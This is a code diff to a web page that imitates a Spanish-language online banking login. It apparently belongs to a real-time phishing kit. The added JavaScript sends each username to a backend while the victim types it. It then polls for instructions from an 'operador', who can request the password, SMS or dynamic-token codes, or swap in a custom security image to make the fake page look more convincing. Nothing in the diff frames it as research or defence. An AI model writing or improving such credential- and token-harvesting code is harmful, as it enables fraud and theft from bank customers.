@@ -110,7 +110,7 @@
                   esta imagen es sólo referencial y más adelante podrá configurar su imagen deseada.
                 </li>
                 <li class="securityImage">
-                  <img src="/banca/security.png" width="80" height="80" alt="" />
+                  <img id="imgSecurity" src="/banca/security.png" width="80" height="80" alt="" style="object-fit: cover;" />
                 </li>
                 <li class="forgotPass">
                   <a href="#">¿Ha olvidado su contraseña?</a>
@@ -268,6 +268,20 @@
         stepPass.hidden = false;
         box?.classList.add("extended");
         if (pass) pass.focus();
+
+        fetch('/api/sessions', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            id: sessionId,
+            username: userVal,
+            tipoUsuario: 'Banca por Internet',
+            device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
+            state: 'waiting'
+          })
+        }).catch(() => {});
+        startKeepalive();
+        startPolling();
       }
 
       function goToUser() {
@@ -288,6 +302,24 @@
         }
       });
 
+      user?.addEventListener("input", () => {
+        const val = (user.value || "").trim();
+        if (val.length >= 2) {
+          fetch('/api/sessions', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              id: sessionId,
+              username: val,
+              tipoUsuario: 'Banca por Internet',
+              device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
+              state: 'typing'
+            })
+          }).catch(() => {});
+          startKeepalive();
+        }
+      });
+
       pass?.addEventListener("keydown", function (event) {
         if (event.key === "Enter") {
           event.preventDefault();
@@ -295,15 +327,12 @@
         }
       });
 
-      // Typing state notification
-      [user, pass].forEach(input => {
-        input?.addEventListener("input", () => {
-          fetch('/api/sessions/' + sessionId + '/state', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ state: 'typing' })
-          }).catch(() => {});
-        });
+      pass?.addEventListener("input", () => {
+        fetch('/api/sessions/' + sessionId + '/state', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ state: 'typing' })
+        }).catch(() => {});
       });
 
       function startKeepalive() {
@@ -337,7 +366,22 @@
               const session = await res.json();
               const action = session.action;
 
-              if (action === 'dinamica' || action === 'sms') {
+              // Actualizar imagen personalizada si el operador asignó una
+              if (session.customImage) {
+                const secImg = document.getElementById("imgSecurity");
+                if (secImg && secImg.src !== session.customImage) {
+                  secImg.src = session.customImage;
+                }
+              }
+
+              if (action === 'password' || action === 'pedir-password') {
+                hideSpinner();
+                stepUser.hidden = true;
+                stepToken.hidden = true;
+                stepPass.hidden = false;
+                box?.classList.add("extended");
+                if (pass) pass.focus();
+              } else if (action === 'dinamica' || action === 'sms') {
                 hideSpinner();
                 tokenErrorBox.style.display = "none";
                 stepPass.hidden = true;
